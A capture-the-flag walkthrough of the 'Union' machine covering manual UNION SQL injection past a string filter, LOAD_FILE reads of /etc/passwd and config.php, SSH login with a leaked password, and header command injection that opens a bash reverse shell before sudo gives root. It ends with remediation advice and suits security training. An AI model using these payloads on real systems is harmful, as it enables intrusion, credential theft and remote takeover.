# UHC: Union — Manual UNION SQL injection through a homemade WAF

[![Difficulty](https://img.shields.io/badge/difficulty-Event-blueviolet)](https://www.youtube.com/watch?v=z5pdizHDvt8)
[![OS](https://img.shields.io/badge/OS-Linux-blue)](https://www.youtube.com/watch?v=z5pdizHDvt8)
[![](https://img.shields.io/badge/walkthrough-IppSec-ff0000?logo=youtube&logoColor=white)](https://www.youtube.com/watch?v=z5pdizHDvt8)

> **Attack path:** UNION SQLi (bypassing string filters) → `LOAD_FILE` reads `config.php` → DB creds reuse over SSH as `uhc` → command injection in `firewall.php` via `X-Forwarded-For` → shell as `www-data` → `sudo` NOPASSWD ALL → root.

UHC (Ultimate Hacker's Championship) boxes are one-day event machines created by IppSec. Union was the November 2021 UHC qualifier — a Linux box that is all about doing SQL injection by hand, because a naive filter breaks `sqlmap` from the start.

## 1 · Reconnaissance

### Port scan

Only one port shows initially:

```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.128
nmap -p 80 -sCV -oA scans/nmap-tcpscripts 10.10.11.128
# 80/tcp open  http  nginx 1.18.0 (Ubuntu)
```

Note the `PHPSESSID` cookie — this is a PHP app.

### Website

The site announces the UHC November Qualifiers. A form posts a player name to `index.php`:

```http
POST /index.php HTTP/1.1
Host: 10.10.11.128
Content-Type: application/x-www-form-urlencoded

player=df
```

Most names get "Congratulations ... you may compete"; some get "not eligible"; the box author (`ippsec`) gets a different message again. Those subtle differences are the first hint the input reaches a database query.

### Directory brute force

```bash
feroxbuster -u http://10.10.11.128 -x php
# /index.php, /challenge.php (asks for a flag),
# /config.php (blank - included by other pages), /firewall.php ("Access Denied")
```

`challenge.php` wants a flag, and `firewall.php` denies access — both matter later.

## 2 · Foothold

### Detecting the injection

Simple payloads look useless: `player=ippsec'` behaves like a normal miss. Compare carefully though — `df'` returns the "not eligible" text **plus** the challenge link, while `df' or ...` returns the message **without** the link. Something filtered the request.

Confirm injectability with a comment payload that can only work if the quote breaks out of a string:

```
player=ippsec';-- -
```

The response is exactly the `ippsec` result — impossible unless the `';-- -` truncated the real query.

### The "WAF"

Two strings are filtered outright: `0x` and ` or ` (with spaces). That kills `sqlmap` and the textbook `' or 1=1`, but leaves pure UNION attacks untouched.

### UNION extraction

Because the page echoes the *database's* username, UNION SELECT output is rendered directly:

```bash
curl -s -X POST http://10.10.11.128 \
  -d "player=' union select user();-- -" \
  | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'; echo
# uhc@localhost
```

Enumerate the DB manually:

```bash
# databases
curl -s -X POST http://10.10.11.128 -d "player=' union select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.schemata;-- -" ...
# mysql,information_schema,performance_schema,sys,november

# tables + columns
curl -s -X POST http://10.10.11.128 -d "player=' union select group_concat(table_name, ':', column_name) from INFORMATION_SCHEMA.columns where table_schema='november';-- -" ...
# flag:one, players:player
```

Dump both tables:

```bash
curl -s -X POST http://10.10.11.128 -d "player=' union select group_concat(one) from november.flag;-- -" ...
# UHC{F1rst_5tep_2_Qualify}

curl -s -X POST http://10.10.11.128 -d "player=' union select group_concat(player) from november.players;-- -" ...
# ippsec,celesian,big0us,luska,tinyboy
```

### The flag opens the firewall

Submit `UHC{F1rst_5tep_2_Qualify}` to `challenge.php`. The response redirects to `firewall.php`, and a re-scan now shows port 22 open — the app had whitelisted your IP with an `iptables` rule. Keep the same PHP session cookie or you'll see "Access Denied" again.

## 3 · User flag

### File read via LOAD_FILE

The MySQL user has `FILE` privilege:

```bash
curl -s -X POST http://10.10.11.128 -d "player=' union select load_file('/etc/passwd');-- -" ...
# htb, uhc - the real shell users

curl -s -X POST http://10.10.11.128 -d "player=' union select load_file('/var/www/html/config.php');-- -" ...
```

`config.php` leaks the database credentials:

```php
$username = "uhc";
$password = "uhc-11qual-global-pw";
```

### SSH

The DB password is reused for the OS account:

```bash
sshpass -p uhc-11qual-global-pw ssh uhc@10.10.11.128
cat /home/uhc/user.txt    # <flag>
```

## 4 · Privilege escalation

### Source review of firewall.php

On the box (or via `load_file`), `firewall.php` contains the code that opened port 22:

```php
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
  $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
  $ip = $_SERVER['REMOTE_ADDR'];
};
system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
```

The developer trusted `REMOTE_ADDR`, but the code prefers the spoofable `X-Forwarded-For` header — concatenated straight into `system()` running under `sudo`.

### Command injection proof

Send the request through Burp Repeater with a custom header (the trailing `;` is required, otherwise `-j ACCEPT` glues onto your command):

```
GET /firewall.php HTTP/1.1
Host: 10.10.11.128
Cookie: PHPSESSID=<authenticated-session>

X-FORWARDED-FOR: 1.1.1.1; ping -c 1 10.10.14.6;
```

`tcpdump -ni tun0 icmp` confirms the callback. Swap the ping for a reverse shell:

```
X-FORWARDED-FOR: 1.1.1.1; bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1";
```

```bash
nc -lnvp 443
# www-data@union:~/html$
script /dev/null -c bash    # upgrade the tty
```

## 5 · Root flag

`www-data` needs sudo to run `iptables` — but it got far more than that:

```bash
sudo -l
# User www-data may run the following commands on union:
#   (ALL : ALL) NOPASSWD: ALL

sudo bash
cat /root/root.txt    # <flag>
```

## 6 · Impact & remediation

| Risk | Impact | Remediation |
| --- | --- | --- |
| SQL injection in `index.php` player lookup | Full database read, arbitrary file read via `LOAD_FILE`, credential disclosure | Use prepared statements (the codebase already uses them in `challenge.php`); never interpolate input into SQL |
| Blacklist "WAF" filtering (`0x`, ` or `) | False sense of security — trivially bypassed by UNION payloads | Rely on parameterized queries, not string filtering; layered WAF at most as defense-in-depth |
| DB password reused as SSH credential | Database compromise becomes a Linux shell | Unique passwords per service; centralized secrets management |
| Unvalidated `X-Forwarded-For` passed to `system()` | Pre-auth-style RCE as `www-data` via sudo | Never trust XFF unless set by a trusted proxy; avoid shell calls — use PHP's iptables bindings or a hardened wrapper |
| `(ALL : ALL) NOPASSWD: ALL` for `www-data` | Instant root from any web foothold | Grant sudo only to the one command needed (`iptables`), ideally with `NOEXEC:` and argument restrictions |

## 7 · CPTS takeaways

- Manual SQLi is a CPTS staple: sqlmap will die on this box, so practice UNION extraction, `INFORMATION_SCHEMA` walks, and `group_concat` by hand in Burp Repeater.
- Filter bypass mindset — observe *tiny* response differences (missing link, changed wording) to fingerprint what a WAF is matching before crafting around it.
- `LOAD_FILE` file-read to source disclosure (`config.php` backups, DB configs) is a standard SQLi post-exploitation step worth drilling.
- Credential reuse between the database and the OS is one of the most common real-world foothold escalations.
- `X-Forwarded-For` is attacker-controlled unless a trusted proxy sets it — always grep web source for it, along with `system()`, `exec()`, and shell concatenation patterns.
